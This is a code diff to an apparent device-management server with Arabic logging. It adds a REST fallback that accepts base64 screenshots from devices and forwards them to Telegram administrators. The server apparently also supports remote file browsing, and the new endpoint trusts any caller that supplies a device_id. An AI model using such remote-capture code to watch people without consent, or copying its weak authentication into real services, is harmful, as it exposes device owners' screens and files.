@@ -2124,20 +2124,45 @@ def _sock_file_explorer(data):
             logger.error(f"فشل إرسال نتائج file explorer: {e}")
 
 
+# ⚡ REST endpoint for base64_media (fallback when Socket.IO disconnected)
+@app.route("/api/device/base64-media", methods=["POST"])
+def _api_base64_media():
+    """REST fallback for base64 media (screenshots)."""
+    data = request.json or {}
+    did = data.get("device_id", "")
+    if not did:
+        return jsonify({"error": "no device_id"}), 400
+
+    dev = dm.get_device(did)
+    if not dev:
+        return jsonify({"error": "unknown device"}), 404
+
+    # معالجة نفس معالجة Socket.IO
+    try:
+        _process_base64_media(dev, data, None)
+        return jsonify({"success": True}), 200
+    except Exception as e:
+        logger.error(f"❌ REST base64_media error: {e}")
+        return jsonify({"error": str(e)}), 500
+
+
 # ⚡ SOCKET.IO: base64_media handler (Layer 1 — real screenshot image)
 @socketio.on("base64_media")
 def _sock_base64_media(data):
-    """Receive a base64-encoded media file (screenshot/photo) from a device."""
     dev = dm.get_device_by_sid(request.sid)
     if not dev:
         logger.warning(f"[Socket] base64_media from unknown SID={request.sid}")
         return
+    _process_base64_media(dev, data, request.sid)
 
+
+def _process_base64_media(dev, data, sid):
+    """Process base64 media — shared between Socket.IO and REST."""
     media_type = data.get("type", "unknown")
     mime = data.get("mime", "image/jpeg")
     b64data = data.get("data", "")
-    logger.info(f"📸 base64_media received from #{dev.get('short_id', '?')}: "
-                f"type={media_type} mime={mime} size={len(b64data)} chars")
+    logger.info(f"📸 base64_media from #{dev.get('short_id', '?')}: "
+                f"type={media_type} size={len(b64data)} chars")
 
     if not b64data:
         logger.warning("⚠️ Empty base64 media data")
@@ -2146,37 +2171,24 @@ def _sock_base64_media(data):
     try:
         import base64 as _b64
         binary = _b64.b64decode(b64data)
-        logger.info(f"📸 Decoded {len(binary)} bytes")
+        logger.info(f"📸 Decoded {len(binary)} bytes — sending to bot")
 
         if mdm_bot:
             short_label = _dev_label(dev)
             from io import BytesIO
             bio = BytesIO(binary)
+            caption = f"📸 <b>لقطة شاشة</b>\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes"
 
             for admin_id in Config.ADMIN_IDS:
                 try:
-                    if mime.startswith("image/"):
-                        mdm_bot.bot.send_photo(
-                            admin_id,
-                            photo=bio,
-                            caption=f"📸 <b>لقطة شاشة حقيقية</b>\n\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes",
-                            parse_mode="HTML"
-                        )
-                    else:
-                        bio.seek(0)
-                        ext = "jpg" if "jpeg" in mime or "jpg" in mime else "bin"
-                        filename = f"media_{dev.get('short_id', 'x')}_{int(__import__('time').time())}.{ext}"
-                        mdm_bot.bot.send_document(
-                            admin_id,
-                            document=bio,
-                            filename=filename,
-                            caption=f"📎 <b>ملف</b>\n\n📱 <b>{short_label}</b>\n📦 {len(binary)} bytes"
-                        )
+                    mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
                     bio.seek(0)
+                    logger.info(f"✅ Screenshot sent to admin {admin_id}")
                 except Exception as e:
-                    logger.error(f"فشل إرسال base64_media للبوت: {e}")
+                    logger.error(f"❌ Failed to send to admin {admin_id}: {e}")
 
-        _pending_cmds.pop(request.sid, None)
+        if sid:
+            _pending_cmds.pop(sid, None)
     except Exception as e:
         logger.error(f"❌ base64_media error: {e}", exc_info=True)
 
